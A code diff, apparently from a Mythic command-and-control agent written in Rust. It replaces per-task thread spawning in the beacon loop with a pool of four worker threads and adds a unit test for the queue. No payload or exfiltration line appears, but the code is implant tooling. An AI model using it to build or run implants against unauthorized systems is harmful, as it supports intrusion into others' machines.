@@ -1,6 +1,9 @@
 use core::sync::atomic::Ordering;
 use std::panic::catch_unwind;
-use std::sync::mpsc::{self, Receiver, RecvTimeoutError, Sender};
+use std::sync::{
+    Arc, Mutex,
+    mpsc::{self, Receiver, RecvTimeoutError, Sender},
+};
 use std::thread::sleep;
 use std::time::{Duration, Instant};
 
@@ -22,6 +25,8 @@ use crate::{
 };
 
 // ── Helpers ─────────────────────────────────────────────
+
+const TASK_WORKER_THREADS: usize = 4;
 
 struct CompletedTask {
     command: String,
@@ -46,12 +51,36 @@ fn safe_dispatch_with_extras(task: &mythic::TaskMessage) -> Vec<TaskResponse> {
     out
 }
 
-fn dispatch_async(task: mythic::TaskMessage, completed_tx: Sender<CompletedTask>) {
-    std::thread::spawn(move || {
-        let command = task.command.clone();
-        let responses = safe_dispatch_with_extras(&task);
-        let _ = completed_tx.send(CompletedTask { command, responses });
-    });
+fn dispatch_task(task: mythic::TaskMessage, completed_tx: &Sender<CompletedTask>) {
+    let command = task.command.clone();
+    let responses = safe_dispatch_with_extras(&task);
+    let _ = completed_tx.send(CompletedTask { command, responses });
+}
+
+fn start_task_workers(completed_tx: Sender<CompletedTask>) -> Sender<mythic::TaskMessage> {
+    let (task_tx, task_rx) = mpsc::channel::<mythic::TaskMessage>();
+    let task_rx = Arc::new(Mutex::new(task_rx));
+
+    for _ in 0..TASK_WORKER_THREADS {
+        let task_rx = Arc::clone(&task_rx);
+        let completed_tx = completed_tx.clone();
+        std::thread::spawn(move || {
+            loop {
+                let task = {
+                    let receiver = task_rx
+                        .lock()
+                        .unwrap_or_else(|poisoned| poisoned.into_inner());
+                    receiver.recv()
+                };
+                match task {
+                    Ok(task) => dispatch_task(task, &completed_tx),
+                    Err(_) => break,
+                }
+            }
+        });
+    }
+
+    task_tx
 }
 
 fn get_agent<C: C2Transport>(payload_uuid: Uuid, c2s: &[C]) -> MythicResult<MythicAgent> {
@@ -336,6 +365,7 @@ pub fn run(config: Config) -> MythicResult<()> {
     let mut rng = rand::thread_rng();
     let mut pending: Vec<TaskResponse> = Vec::new();
     let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
+    let task_tx = start_task_workers(completed_tx);
     let mut next_tasking_at = Instant::now() + next_beacon_delay();
 
     loop {
@@ -376,8 +406,13 @@ pub fn run(config: Config) -> MythicResult<()> {
                 if DEBUG.load(Ordering::Relaxed) {
                     info!("task: {:?}", tasking);
                 }
-                for t in tasking.tasks {
-                    dispatch_async(t, completed_tx.clone());
+                for task in tasking.tasks {
+                    if let Err(e) = task_tx.send(task) {
+                        if DEBUG.load(Ordering::Relaxed) {
+                            eprintln!("[!] task worker queue closed: {e}");
+                        }
+                        return Err(MythicError::protocol("task worker queue closed"));
+                    }
                 }
                 next_tasking_at = Instant::now() + next_beacon_delay();
             }
@@ -388,5 +423,43 @@ pub fn run(config: Config) -> MythicResult<()> {
                 next_tasking_at = Instant::now() + Duration::from_secs(5);
             }
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::collections::HashSet;
+
+    #[test]
+    fn task_workers_dispatch_queued_tasks() {
+        let (completed_tx, completed_rx) = mpsc::channel::<CompletedTask>();
+        let task_tx = start_task_workers(completed_tx);
+        let mut ids = HashSet::new();
+
+        for i in 0..(TASK_WORKER_THREADS + 3) {
+            let id = Uuid::new_v4();
+            ids.insert(id);
+            task_tx
+                .send(mythic::TaskMessage {
+                    id,
+                    command: format!("unknown_{i}"),
+                    parameters: "{}".into(),
+                    ..Default::default()
+                })
+                .unwrap();
+        }
+        drop(task_tx);
+
+        let mut received = HashSet::new();
+        for _ in 0..ids.len() {
+            let completed = completed_rx
+                .recv_timeout(Duration::from_secs(2))
+                .expect("worker should return a completed response");
+            assert_eq!(completed.responses.len(), 1);
+            received.insert(completed.responses[0].task_id);
+        }
+
+        assert_eq!(received, ids);
     }
 }
